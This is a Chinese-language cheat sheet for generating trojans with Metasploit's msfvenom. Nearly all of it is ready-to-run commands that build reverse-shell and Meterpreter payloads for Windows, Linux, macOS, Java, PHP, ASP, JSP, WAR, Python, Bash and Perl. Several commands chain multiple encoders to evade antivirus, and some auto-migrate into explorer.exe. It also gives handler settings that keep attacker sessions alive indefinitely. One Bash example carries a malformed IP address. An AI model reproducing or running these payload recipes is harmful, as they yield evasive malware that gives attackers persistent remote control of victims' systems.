## msfvenom生成木马

#### 一、msfvenom命令介绍
	-p  payload
    -e  编码方式  X86/shikata_ga_nai 是指定对shellcode的编码方法
    -i  编码次数
    -b  在生成的程序中避免出现的值
    -f  生成exe格式
    msfvenom -l payload    查看可以利用用的payload
    msfvenom -l encoders   查看所有编码
    msfvenom -l | grep windows | grep x64 | grep tcp
    msfvenom -p windows/meterpreter/reverse_tcp --list-options  查看payload支持哪些选项

    use exploit/multi/handler
    msf6 exploit(multi/handler) > set exitonsession false   可以在接收到seesion后继续监听端口，保持侦听
    msf6 exploit(multi/handler) > set sessioncommunicationtimeout 1     默认情况下，如果一个会话将在5分钟(300秒)没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
    msf6 exploit(multi/handler) > set sessionexpirationtimeout 0    默认情况下，一个星期(604800秒)后，会话将被强制关闭,修改为0可永久不会被关
    msf6 exploit(multi/handler) > exploit -j -z
    -j      作为job开始运行
    -z      不立即进行session交换,也即是自动后台运行

    msf6 > handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/shell_reverse_tcp      快速设置监听模式

##### 1、Windows
    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 13 -b '\x00\xff\x0a' LHOST=192.168.1.151 --platform windows LPORT=443 -f exe >/root/doors.exe  

    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.156.227 lport=446 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -o /root/payload.exe

    自动迁移进程
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.156.227 LPORT=446 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o shell.exe

    msfvenom -p windows/meterpreter/reverse_https lhost=192.168.156.227 lport=446 -e x86/shikata_ga_nai -b "\x00\xff\x0a" -i 13 -f raw --platform win PrependMigrate=true PrependMigrateProc=explorer.exe| msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 13 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 13 -f exe -o /root/payload.exe

    msfvenom -p windows/meterpreter/reverse_tcp_rc4 lhost=192.168.156.227 lport=446 RC4PASSWORD=tidesec  -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o shell.exe


	
##### 2、Linux  
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.151 LPORT=443 -f elf -o ~/Desktop/123.elf 
	
##### 3、Mac
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f macho > shell.macho
	
##### 4、Java
    msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.151 LPORT=1234 w>123.jar

##### 5、Php  
    msfvenom  -p  php/meterpreter/reverse_tcp LHOST=192.168.0.5 -f raw >/root/test.php  
    
    use exploit/multi/handler  
    set lhost IP   
    set payload php/meterpreter/reverse_tcp  
    set ExitOnSession false             #即使一个连接退出,仍然保持listening状态
    exploit -j  -z


##### 6、Asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f asp > shell.asp

##### 7、JSP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw > shell.jsp

##### 8、WAR
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f war > shell.war

##### 9、Python
    msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=4444 -f raw > shell.py

##### 10、Bash
    msfvenom -p cmd/unix/reverse_bash LHOST=192.168，1，1 LPORT=4444 -f raw > shell.sh

##### 11、Perl
    msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4444 -f raw > shell.pl